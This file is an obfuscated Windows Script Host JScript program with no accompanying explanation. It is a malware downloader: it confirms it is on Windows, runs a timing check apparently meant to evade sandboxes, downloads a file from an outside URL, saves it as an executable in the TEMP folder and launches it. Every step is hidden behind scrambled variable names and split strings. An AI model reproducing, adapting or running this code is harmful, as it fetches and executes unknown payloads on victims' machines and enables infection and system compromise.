var _WK = false;
var _RE = "CreateObject";
var _P1 = function _QB() {return WScript[_RE]("WScript"+".Shell");}(), _VC = 11;
var _QJ = "MSXML2.XMLHTTP";
var _CG = 2123213;
var _YT = 0;
function _NJ(_QN){_P1["Run"](_QN, _YT, _YT);};
function _VV(){return _QJ + "";};
function _UL(_S1, _SL){_YT = _YT * 1; return _S1 - _SL;};
function _S(){return _RE;};
/*@cc_on
  @if (@_win32 || @_win64)
    _WK = true;
  @end
@*/
if (_WK)
{
var _MA = "";
function _EL(){return 22;};
var _RO = 0; var _DK = 0;
function _P()
{
var _QA = new this["Date"]();
var _V = _QA["getUTCMilliseconds"]();
WScript["Sleep"](_EL());
var _QA = new this["Date"]();
var _UX = _QA["getUTCMilliseconds"]();
WScript["Sleep"](_EL());
var _QA = new this["Date"]();
var _W = _QA["getUTCMilliseconds"]();
var _RO = "_VH";
_RO = _UL(_UX, _V);
var _DK = "_P0";
_DK = _UL(_W, _UX);
_MA = "open";
return _UL(_RO, _DK);
}
var _KU = false;
var _K = false;
for (var _R = _YT; _R < _EL() * 1; _R++){if (_P() != _YT){
_KU = true; 
_DK = "31" + 11 * _RO + _DK; 
_K = true; 
break;
}}
function _JR() {return ((_KU == true) && (_KU == _K)) ? 1 : _YT;};
if (_KU && _JR() && _K){
function _WG() {return _P1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "jqiokhnRHRg.ex" + "e";};
 _FR = _VV();
 _I = WScript[_RE](_FR);
 var _CB = 1;
 while (_CB){
try {
	if (_CB == 1)
	{
		_I[_MA]("GET", "http://mentalmathcompetition.com/k4isa", false);
		_I["send"]();
		_FV = "Sleep";
	}
	WScript[_FV](_EL() + 120); 
	if (_I["readystate"] < 2 * 2) continue;
	_CB = _YT;
	function _ND(_S0) {var _D = (1, 2, 3, 4, 5, _S0); return _D;};
	_AX = WScript[_S()]("ADODB.Stream");
	_FR = _AX;
	_FR[_MA]();
	_FR["type"] = _ND(1);
	_FR["write"](_I["ResponseBody"]);
	_AX["position"] = _ND(_YT);
	_FR["Save" + "ToFile"](_WG(), 2);
	_AX["cl"+"ose"]();
	_G = _WG();
	_NJ(_G);
} catch(_VI){};
}
}
}

